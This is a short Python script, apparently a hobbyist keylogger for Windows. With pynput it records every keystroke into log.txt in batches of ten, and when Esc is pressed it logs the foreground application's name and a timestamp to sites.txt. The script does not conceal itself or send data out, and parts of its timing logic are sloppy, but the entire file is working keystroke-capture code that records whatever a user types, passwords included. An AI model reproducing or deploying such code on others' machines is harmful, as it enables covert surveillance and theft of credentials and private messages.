import pynput
from pynput.keyboard import Key,Listener 
import win32gui
from win32gui import GetForegroundWindow
import psutil
import time
import win32process
from datetime import datetime

count = 0
keys = []
def on_release(key):
    if key==Key.esc:
        stuff()

        return False


def on_press(key):
    global keys,count
    counter = 0
    counter+=1
    
    keys.append(key)
    count+=1
    print("{0} pressed".format(key))
    if count>=10:
        count = 0 
        write_files(keys)
        keys=[]



def write_files(keys):
    with open ("log.txt","a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space")>0:
                f.write('\n')    
            elif k.find("Key")==-1:
                f.write(k)


process_time={}
timestamp = {}
def stuff():
    with open ("sites.txt","a") as f:
        current_app = psutil.Process(win32process.GetWindowThreadProcessId(GetForegroundWindow())[1]).name().replace(".exe", "")
        timestamp[current_app] = int(time.time())
        time.sleep(1)
        if current_app not in process_time.keys():
            process_time[current_app] = 0
            process_time[current_app] = process_time[current_app]+int(time.time())-timestamp[current_app]
            counter=0
            f.write(str(process_time))
            now = datetime.now()
            print("now =", now)
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            f.write("\n the time and date is: "+dt_string)
        	


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()




